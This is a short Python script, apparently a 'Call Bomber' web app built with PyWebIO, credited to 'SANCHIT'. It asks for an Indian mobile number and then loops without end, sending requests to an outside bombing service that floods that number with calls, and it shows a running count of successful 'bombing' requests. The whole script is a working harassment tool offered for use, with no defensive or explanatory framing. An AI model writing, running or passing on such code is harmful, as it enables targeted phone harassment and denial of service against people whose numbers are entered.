import pywebio.output as output
import pywebio.input as input
import pywebio
import requests,time
c = 0
f = 0
def MyApp():
    global f, c
    skc = input.input_group(' • Call Bomber By: ( SANCHIT 💸 )', [input.input(" • Enter Your Number (without +91) ", name="SK")]);SK = str(skc["SK"])
    while True:
        req = requests.get(f"https://bomber-tools.xyz/?mobile={SK}&accesskey=BomberSmm&submit=Submit").text
        if 'started' in req:
            c += 1
            output.put_html(f'<h3>✅ Bombing On - Count: {c}</h3><i>    BY: SANCHIT</i>')
            time.sleep(.1)
        else:
            f += 1
            output.put_html(f'<h3>❌ Bombing Off - Count: {f}</h3><i>    BY: SANCHIT</i>')
            time.sleep(.1)

if __name__ == '__main__':
    pywebio.start_server(MyApp, port=8086, debug=True)
￼Enter
